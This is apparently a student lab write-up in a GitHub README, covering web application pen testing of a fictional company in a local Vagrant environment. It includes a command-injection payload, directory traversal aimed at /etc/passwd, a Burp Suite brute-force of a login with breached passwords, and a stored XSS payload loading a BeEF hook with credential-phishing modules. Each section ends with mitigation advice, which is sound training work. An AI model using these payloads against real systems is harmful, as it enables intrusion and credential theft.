
<p align="center">
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/app-hardening-banner.jpg" alt="osTicket logo"/>
</p>

<h1>Web Application Vulnerabilities</h1>
This tutorial outlines an application security engineer at Replicants, testing web vulnerabiltiies on new web applications created.<br />


<h2>Environments and Technologies Used</h2>

- Oracle VM (Virtual box)
- Vagrant

<h2>List of Prerequisites</h2>

- Dot dot slash attacks
- Web application vulnerability assessments
- Injection
- Brute force attacks
- Broken authentication
- Burp Suite
-Web proxies
-Directory traversal
-Beef
-Cross-site scripting
-Malicious payloads

<h2>Installation Steps</h2>
<h3>"Your wish is my command"</h3>

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-1.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

First navigated to a new web application built by replicants, (http://192.168.13.25/vulnerabilities/exec/). This new page was built by Replicants in order to enable their customers to `ping` an IP address. The web page will return the results of the ping command back to the user. I started by testing the webpage by entering the IP address `8.8.8.`. Behind the scenes, when submitted, the IP you type in the field is injected into a command that runs aganist the Replicants webserver. 


<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-3.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Next, I tested if I could manipulate the input to cause an unientended result by entering the following command (payload) in the field: `8.8.8.8 && pwd`. With the results determining that the new application is vulnerable. 

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-4.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

I was tasked with using the dot-dot-slash method to design two payloads that will display the contents on the following files: `/etc/passwd` `/etc/hosts` Based on my findings I recommended that segregation of confidential files from the web server and accessible directories, permissions to restrict web server account accessibility, and server-side validation that does not allow selection of unintended files. 

<h3>"A Brute Force To Be Recokoned With"</h3>

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-5.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Still on Vagrant, navigated to the webpage http://192.168.13.35/ba_insecure_login_1.php. This page is an administrative web application that serves as a simple login page.
In Vagrant command line, ran command `sudo burpsuite`. OPen firefoc with `foxyProxy`. 

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-6.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Using the web application tool 'BurpSuite', the following data was intercepted:

```
REQUEST TO http://192.168.13.35:80
```
```
POST /ba_insecure_login_1.php HTTP/1.1
Host: 192.168.13.35
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Connection: close
Referer: http://192.168.13.35/ba_insecure_login_1.php
Cookie: PHPSESSID=l998k837fiaj3b5c1o8kcsf0m6; security_level=0
Upgrade-Insecure-Requests: 1

login=test-user&password=password&form=submit
```

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-7.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

I sent the proxy intercept results to the intruder tab and verified the `target` 

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-8.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Went to the positions tab within intruder, and selected attack type `cluster bomb`. Configured and added `login` and `password` as positions. 

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-9.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Went to the `payloads` tab, `payload` type set as `simple list`. Added the login user ID from `List of Administrators` file into payload set 1. Added passwords from `Breached list of passwords` file into payload set 2.

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-10.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Started the attack. After analysis of intruder attack results, the login username/password combination of `Tonystark` and `IamironMan` did result in a successful login. I recommended mitigations including requiring complex usernames and passwords, using multi-factored authentication, and enable a lockout after a certain amount of failed login attempts. 

<h3>"Where's the BeEF"</h3>

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-11.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

To prepare Replicants website, I navigated to Vagrant, ran command: `~/Documents/web-vulns$ docker-compose up`. Went to `http://192.168.13.25/vulnerabilities/xss_s/` Reset and logged back in. To setup BeEF, on Vagrant open the command line and entered: `sudo beef`. To access the BeEF GUI, right-click the first URL `UI_URL: http://127.0.0.1:3000/ui/panel` and select open link. Logged in with the following credentials: Username: `beef` password: `feeb`.

```
BeEF hook: http://127.0.0.1:3000/hook.js
Playload: <script src="http://127.0.0.1:3000/hook.js"></script>
```

I injected this payload and an issue that was found was there is only a max length= "50" in orginal source code, therefore we can not input the whole payload code, so by right-clicking on the web page and selecting "inspecting the element". Chaged the maxlength="100".

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-12.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>
<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-13.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>

Since I hooked into the Replicants website, I attempted a couple of BeEF exploits from `social engineering >> pretty theft`, `social engineering>> fake notification bar`, `host>> get geolocation(third party)`. I recomment input validation. It is a common method used to mitigate cross-site scripting. 

<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-14.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>
<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-15.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>
<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-16.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>
<p>
<img src="https://github.com/kleeloy/Pen-Testing-Web-Application-Vulnerabilities/blob/main/Diagrams/Web-app-17.png" height="60%" width="60%" alt="Disk Sanitization Steps"/>
</p>


